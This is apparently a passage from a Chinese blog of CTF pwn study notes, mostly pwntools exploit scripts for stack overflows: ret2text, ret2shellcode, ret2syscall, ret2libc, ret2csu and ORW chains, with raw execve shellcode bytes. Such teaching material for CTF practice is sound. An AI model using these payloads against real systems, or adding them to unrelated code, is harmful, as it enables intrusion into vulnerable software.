<p>得到了 system 的地址，就可以利用 read 函数读入 “/bin/sh”，从而得到 shell，完整的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn200'</span>)</span><br><span class="line">io = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x08048484</span></span><br><span class="line">start_addr = <span class="number">0x080483d0</span></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">pppr_addr = <span class="number">0x0804856c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload  = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">    payload += p32(write_plt)</span><br><span class="line">    payload += p32(vuln_addr)</span><br><span class="line">    payload += p32(<span class="number">1</span>)</span><br><span class="line">    payload += p32(addr)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    data = io.recv()</span><br><span class="line">    log.info(<span class="string">"leaking: 0x%x --&gt; %s"</span> % (addr, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system address: 0x%x"</span> % system_addr)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(vuln_addr)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><ul>
<li><p>使用沙箱可以 禁用/允许 一些系统调用：</p>
<ul>
<li>沙箱信息查看： <code>seccomp-tools dump ./binfile</code></li>
</ul>
</li>
<li><p>可以使用orw时：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">'./flag'</span>) <span class="comment">#打开flag，得到fd</span></span><br><span class="line">read(fd, buf, <span class="number">0x30</span>) <span class="comment">#通过fd将flag的内容读取到内存</span></span><br><span class="line">write(<span class="number">1</span>, buf, <span class="number">0x30</span>) <span class="comment">#将内存中的flag内容输出到屏幕</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pl = <span class="string">"""</span></span><br><span class="line"><span class="string">xor eax, eax;</span></span><br><span class="line"><span class="string">xor ebx, ebx;</span></span><br><span class="line"><span class="string">xor ecx, ecx;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x00006761; # \x00\x00ga</span></span><br><span class="line"><span class="string">push 0x6c662f2e; # lf/.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 5;      # open syscall number</span></span><br><span class="line"><span class="string">mov ebx, esp;    # filename</span></span><br><span class="line"><span class="string">int 0x80;        # eax = fd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, eax;    # read syscall number</span></span><br><span class="line"><span class="string">mov ecx, esp;    # buff = esp</span></span><br><span class="line"><span class="string">mov edx, 0x30;   # size = 0x30</span></span><br><span class="line"><span class="string">mov eax, 3;      # read syscall number</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, 1;      # fd = stdout</span></span><br><span class="line"><span class="string">mov ecx, esp;    # buff = esp</span></span><br><span class="line"><span class="string">mov edx, 0x30;   # size = 0x30</span></span><br><span class="line"><span class="string">mov eax, 4;      # write syscall number</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pl = asm(pl)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">map(hex, unpack_many(<span class="string">"./flag  "</span>))</span><br><span class="line">[<span class="string">'0x6c662f2e'</span>, <span class="string">'0x20206761'</span>]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><ul>
<li><p>gdb 中确定偏移量：cyclic</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cyclic <span class="number">200</span></span><br><span class="line">cyclic -l <span class="number">0</span>x******** / aaaa</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用gdb-peda提供的pattern_create和pattern_offset。pattern_create是生成一个字符串模板输入后根据EIP来确定覆盖return addr的长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 50</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#39;</span><br><span class="line">gdb-peda$ pattern_offset $ebp</span><br><span class="line">1093681473 found at offset: 40</span><br><span class="line">gdb-peda$ pattern_offset $eip</span><br><span class="line">1094796865 found at offset: 44</span><br><span class="line">gdb-peda$ pattern_offset 0x47414131</span><br><span class="line">1095188801 found at offset: 52</span><br></pre></td></tr></table></figure>
</li>
<li><p>有 system，有 binsh 字符串</p>
<ul>
<li><p>32位参数压栈构造 <code>system(‘/bin/sh’)</code> 也就是字符串压入栈</p>
<ul>
<li>栈结构如下：padding+ebp+&amp;system+ret_addr_for_system+&amp;/bin/sh</li>
</ul>
</li>
<li><pre><code class="python">pl = <span class="number">140</span>*<span class="string">'a'</span>
pl += p32(elf.plt[<span class="string">'system'</span>])
pl += <span class="string">'aaaa'</span>      <span class="comment"># ret_addr_for_system 可以随意编写</span>
pl += p32(<span class="number">0</span>x&amp;binsh)
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 64位参数通过ROP构造 &#96;system(‘&#x2F;bin&#x2F;sh’)&#96;</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;python</span><br><span class="line">  pl &#x3D; 140*&#39;a&#39;</span><br><span class="line">  pl +&#x3D; p64(pop_rdi_ret)+p64(binsh)</span><br><span class="line">  pl +&#x3D; p64(elf.plt[&#39;system&#39;])</span><br></pre></td></tr></table></figure></code></pre>
</li>
</ul>
</li>
<li><p>存在情况： 有时候64bit call system 的时候会崩溃，这是因为2.27有优化，system 的栈地址没有对齐</p>
<ul>
<li>system 前面加一个 ret 指令就好了</li>
</ul>
</li>
<li><p>ROPgadget 查找字符串和可利用 gadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary binfile  --only <span class="string">'pop|ret'</span></span><br><span class="line">ROPgadget --binary binfile  --only <span class="string">'pop|ret'</span> | grep <span class="string">'eax'</span></span><br><span class="line">ROPgadget --binary binfile --string <span class="string">"/bin/sh"</span></span><br><span class="line">ROPgadget --binary binfile  --only <span class="string">'int'</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查找 plt 地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./binfile'</span>)</span><br><span class="line">pl += p64(elf.plt[<span class="string">'system'</span>])</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><ul>
<li><p>程序泄露的获取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"*****"</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">"?"</span>, drop = <span class="literal">True</span>)</span><br><span class="line">log.info(<span class="string">"leak: "</span> + leak)</span><br><span class="line"><span class="comment"># *****0xffa2d5d0?</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh_x86_18=<span class="string">"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x86_20=<span class="string">"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x64_21=<span class="string">"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br></pre></td></tr></table></figure>

<ul>
<li>nop: <code>&quot;\x90&quot;</code></li>
<li>对齐：<code>str.ljust(len, &quot;*&quot;)</code> 、 <code>str.rjust(len, &quot;*&quot;)</code> 、 <code>str.center(len, &quot;*&quot;)</code></li>
</ul>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><ul>
<li><p>syscall -&gt; execve</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">set_rax = <span class="number">0</span>x********</span><br><span class="line">set_rdi = <span class="number">0</span>x********</span><br><span class="line">set_rsi = <span class="number">0</span>x********</span><br><span class="line">set_rdx = <span class="number">0</span>x********</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0</span>x********</span><br><span class="line">do_syscall = <span class="number">0</span>x********</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve("/bin/sh", NULL, NULL)</span></span><br><span class="line"><span class="comment"># rax = 59 # 64 bit</span></span><br><span class="line"><span class="comment"># rdi = &amp;"/bin/sh"</span></span><br><span class="line"><span class="comment"># rsi = 0</span></span><br><span class="line"><span class="comment"># rdx = 0</span></span><br><span class="line"></span><br><span class="line">pl = <span class="number">8</span>*<span class="string">'a'</span></span><br><span class="line">pl += p64(set_rax)+p64(<span class="number">59</span>)</span><br><span class="line">pl += p64(set_rdi)+p64(binsh)</span><br><span class="line">pl += p64(set_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">pl += p64(set_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">pl += p64(do_syscall)</span><br></pre></td></tr></table></figure>
</li>
<li><p>程序执行断开，脚本上运行的话就需要用到另一个工具来断开，这个工具就是pwntools自带的shutdown功能，可以直接关闭流</p>
</li>
<li><p>open-read-write获得flag</p>
<ul>
<li>对于需要系统调用来ROP的题基本上都可以用这种方法来构造ROP链，</li>
<li>于是我们可以想办法去构造这样的代码来拿到flag</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"flag"</span>,READONLY);</span><br><span class="line"><span class="built_in">read</span>(fd,buf,<span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
</li>
<li><p>GOT表劫持获得syscall</p>
<ul>
<li>通过GOT表劫持将alarm函数的GOT地址改为我们想要的函数的地址。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7ea2dc0 &lt;alarm&gt;       endbr64 </span><br><span class="line">  0x7ffff7ea2dc4 &lt;alarm+4&gt;     mov    eax, 0x25</span><br><span class="line">  0x7ffff7ea2dc9 &lt;alarm+9&gt;     syscall </span><br><span class="line">  0x7ffff7ea2dcb &lt;alarm+11&gt;    cmp    rax, -0xfff</span><br><span class="line">► 0x7ffff7ea2dd1 &lt;alarm+17&gt;    jae    alarm+20                &lt;alarm+20&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过gdb调试还可以看到，在alarm偏移量为9的地方是syscall，但是起始地址是endbr64</li>
<li>这里alarm函数的起始地址应该为alarm+4那段地址，于是syscall相对于alarm函数的地址偏移为0x5</li>
<li>地址有了，接下来就是想办法劫持alarm函数，将他的地址改为syscall指令了。</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary Recho --only <span class="string">"add|ret"</span></span><br></pre></td></tr></table></figure>

<ul>
<li>存在add指令，可以修改指定的寄存器指向的地址的值</li>
<li>这里的[]是间接寻址，即将al的值加到rdi寄存器存储的地址上面存储的数据上</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x30</span>  <span class="comment">#覆盖buf[40]; // [rsp+10h] [rbp-30h] </span></span><br><span class="line">payload +=<span class="string">'A'</span>*<span class="number">0x08</span> <span class="comment">#覆盖 rbp</span></span><br><span class="line"><span class="comment">#alarm GOT表劫持到syscall位置</span></span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">0x5</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(alarm_got)</span><br><span class="line">payload += p64(rdi_add_al_ret) </span><br><span class="line"><span class="comment"># 现在 alarm_plt 即是 syscall</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>OPEN_READ_WRITE</p>
<ul>
<li>已经获得了syscall指令，然后又在数据段找到了flag字符串</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000601058 flag            db &#39;flag&#39;,0</span><br></pre></td></tr></table></figure>

<ul>
<li>需要将flag文件打开为一个流，通过syscall实现</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(pop_rdi)+p64(flag_addr)  <span class="comment">#rdi='flag</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#rsi=0(READONLY)</span></span><br><span class="line">payload += p64(pop_rdx_ret)+p64(<span class="number">0</span>) <span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">0x2</span>) <span class="comment"># rax=2,open的调用号为2</span></span><br><span class="line"><span class="comment"># 执行alarm完成GOT表劫持，syscall的传参顺序是rdi，rsi，rdx，rcx，r8，r9</span></span><br><span class="line">payload += p64(alarm_plt)</span><br></pre></td></tr></table></figure>

<ul>
<li>接下里就是将flag文件写到bss段</li>
<li>通过调试可以看到bss段是可写的。于是构造脚本</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将flag传回的值写入到bss段 read(fd,stdin_buffer,100)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>) <span class="comment">#open()打开文件返回的文件描述符一般从3开始，系统环境不一样也可能不是3，依次顺序增加</span></span><br><span class="line">payload += p64(pop_rdx)+p64(<span class="number">0x2d</span>) <span class="comment">#指定长度</span></span><br><span class="line">payload += p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>) <span class="comment"># rsi =写入的地址，用于存取open结果</span></span><br><span class="line">payload += p64(read_plt)</span><br></pre></td></tr></table></figure>

<ul>
<li>最后输出flag即可</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx)+p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">0x01</span>)</span><br><span class="line">payload += p64(write_plt)</span><br></pre></td></tr></table></figure>
</li>
<li><p>再强调一点就是64位系统传参方式都是先用寄存器传参，然后用栈传参，无论是系统调用还是普通的函数调用。传参顺序是rdi，rsi，rdx，rcx，r8，r9。rax寄存器在构造exp中，可用于劫持got表，调用系统序号函数。</p>
</li>
<li><p>断开流，shutdown（‘send’）用于跳出函数无线循环。</p>
</li>
<li><p>补充说明<strong>endbr64</strong>指令</p>
<ul>
<li>Intel CET提供了影子栈及间接跳转指令追踪功能，保护控制流完整性。</li>
<li>Intel CET相关的指令如endbr64是后向（backward）兼容的。</li>
<li>在Intel CET中，间接跳转的处理逻辑中被插入一段过程：将CPU状态从DLE切换成WAIT_FOR_ENDBRANCH。</li>
<li>在间接跳转之后查看下一条指令是不是endbr64。如果指令是endbr64指令，那么该指令会将CPU状态从WAIT_FOR_ENDBRANCH恢复成DLE。另一方面，如果下一条指令不是endbr64，说明程序可能被控制流劫持了，CPU就报错（#CP）。因为按照正确的逻辑，间接跳转后应该需要有一条对应的endbr64指令来回应间接跳转，如果不是endbr64指令，那么程序控制流可能被劫持并前往其它地址（其它任意地址上是以非endbr64开始的汇编代码）（涉及编译器兼容CPU新特性）。</li>
</ul>
</li>
</ul>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul>
<li><p>libc 库中有 system 函数和 binsh 字符串和更好用的gadget，然而往往 ASLR 导致每次 libc 位置变化。</p>
</li>
<li><p>但是 libc 内部偏移不变，如果read函数的真实地址已知，就可以计算出system的真实地址。</p>
</li>
<li><p>由于是按页分配（4KB），libc地址结尾一定是000；</p>
</li>
<li><p>不同版本libc中，函数的偏移基本不同；</p>
</li>
<li><p>通过低三位可以判断使用的libc版本，和其他函数的偏移地址</p>
</li>
<li><p>在线查询： <a href="https://libc.nullbyte.cat/" target="_blank" rel="noopener">https://libc.nullbyte.cat/</a> </p>
</li>
<li><p>常见的可以获取libc地址</p>
<ul>
<li>GOT表保存的地址</li>
<li>栈上的地址</li>
<li>堆上的地址（unsortedbin, largebin, smallbin, …）</li>
</ul>
</li>
<li><p>ret2plt</p>
<ul>
<li>程序中存在write， puts这样的输出函数</li>
<li>通过ROP泄露函数在libc中的真实地址，system地址， binsh地址</li>
<li>通过read来劫持got表，例如将puts改成system</li>
<li>puts(‘/bin/sh’) =&gt; system(‘/bin/sh’) 从而getshell</li>
</ul>
</li>
<li><p>ret2plt 栈设计</p>
<ul>
<li>栈情况：low -&gt; high</li>
<li>padding -&gt; pop rdi ret -&gt; puts@got -&gt; puts@plt -&gt; pop rdi ret -&gt; 0 -&gt; pop rsi ret -&gt; puts@got -&gt; pop rdx ret -&gt; 8 -&gt;read@plt -&gt; pop rdi ret -&gt; &amp;‘/bin/sh’ -&gt; puts@plt ……</li>
<li>code 情况：</li>
<li>ret -&gt; pop rdi -&gt; ret -&gt; jmp puts(puts@got) -&gt; ret -&gt; pop rdi -&gt; ret -&gt; pop rsi -&gt; ret -&gt; pop rdx -&gt; ret -&gt; jmp read(0,puts@got,8) -&gt; ret -&gt; pop rdi -&gt;ret -&gt; jmp*(puts@got)==system</li>
<li>要求： got表可写，即RELRO没有全开时候才能劫持got表；一般程序没有pop rdx;ret 的gadget</li>
</ul>
</li>
<li><p>泄露地址后返回main重新执行栈溢出</p>
<ul>
<li>通过ROP 调用puts@plt，将got表中puts的真实地址泄露出来</li>
<li>栈(low -&gt; high)：pop rdi;ret -&gt; puts@got -&gt; puts@plt 实现泄露libc地址，计算system和binsh的地址</li>
<li>修改后：栈(low -&gt; high)：pop rdi;ret -&gt; puts@got -&gt; puts@plt -&gt; main -&gt; 再次触发溢出；第二次栈情况： padding -&gt; pop rdi;ret -&gt; &amp;‘/bin/sh’ -&gt; system</li>
</ul>
</li>
</ul>
<p>已知libc版本时，本地可用以下方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu11.3_i386.so'</span>)</span><br><span class="line">offset=read_addr-libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system=libc.symbols[<span class="string">'system'</span>]+offset</span><br><span class="line"><span class="comment"># ROPgadget --binary libc6_2.23-0ubuntu11.3_i386.so --string /bin/sh</span></span><br><span class="line"><span class="comment"># 0x0015bb2b : /bin/sh</span></span><br><span class="line">binsh=<span class="number">0x0015bb2b</span>+offset</span><br></pre></td></tr></table></figure>

<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><ul>
<li><p>有通用的可以控制rdx的gadget</p>
</li>
<li><p>在初始化libc的时候会调用一个函数，叫做 __libc_csu_init </p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20210828195245247.png" alt="image-20210828195245247"></p>
</li>
<li><p>结尾有很多pop指令，可以用来当gadget；可以控制rbx, rbp, r12, r13, r14, r15</p>
</li>
<li><p>看一下call附近，在call之前给rdx, rsi, edi进行了赋值</p>
<ul>
<li>第一个参数 edi &lt;- r15</li>
<li>第二个参数 rsi &lt;- r14</li>
<li>第三个参数 rdx &lt;- r13</li>
<li>虽然是给edi赋值但是高位也是0</li>
<li>一般用低位就够了</li>
</ul>
</li>
<li><p>注意到 r13 r14 r15通过之前的gadget是可以控制的所以三个参数我们都可以控制了</p>
</li>
<li><p>而r12和rbx也是可控的，合理使用可以控制call的函数地址</p>
</li>
<li><p>控制方法：</p>
<ul>
<li>例如：想要调用 write</li>
<li>让 rbx = 0</li>
<li>让 r12 = write@GOT</li>
<li>填的不是函数地址，而是存函数地址的指针</li>
</ul>
</li>
<li><p>绕过后边的jnz跳转</p>
<ul>
<li>因为rbx 和rbp 都是可控的</li>
<li>控制rbx=0，rbp=1就可以避免执行跳转</li>
</ul>
</li>
<li><p>注意add rsp, 8，相当于pop了一次。所以跳转过来后相当于pop了7次，填充7*8个字节</p>
</li>
<li><p>继续优化：</p>
<ul>
<li><p>让payload更短</p>
<ul>
<li>重用</li>
<li>某些寄存器已经赋值好了</li>
</ul>
</li>
<li><p>条件没有那么好？</p>
<ul>
<li>最起码可以控制寄存器</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">csu_ptr1 = <span class="number">0x40089A</span></span><br><span class="line">csu_ptr2 = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_pl</span><span class="params">(func, rdi, rsi, rdx)</span>:</span></span><br><span class="line">	rbx = <span class="number">0</span></span><br><span class="line">	rbp = <span class="number">1</span></span><br><span class="line">    r12 = func</span><br><span class="line">	r13 = rdi</span><br><span class="line">	r14 = rsi</span><br><span class="line">	r15 = rdx</span><br><span class="line">	pl = <span class="string">''</span></span><br><span class="line">    pl += p64(csu_ptr1)</span><br><span class="line">    pl += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pl += p64(csu_ptr2)</span><br><span class="line">    pl += <span class="number">7</span>*<span class="number">8</span>*<span class="string">b'a'</span></span><br><span class="line">    <span class="keyword">return</span> pl</span><br><span class="line">init = init_addr</span><br><span class="line">pl = <span class="string">b'a'</span></span><br><span class="line">pl += csu_pl(init,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xdeadbeef</span>)<span class="comment"># init把ret2win放到栈上来调用</span></span><br><span class="line">pl += p64(ret2win)</span><br><span class="line"><span class="comment"># init函数开辟栈空间但不会影响寄存器值(只操作了rax)</span></span><br></pre></td></tr></table></figure>

<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>64位</p>
<ul>
<li>shellcode</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"><span class="comment">#pwntools</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">shellcode = asm(shellcreaft.sh())</span><br></pre></td></tr></table></figure>

<ul>
<li>orw</li>
</ul>
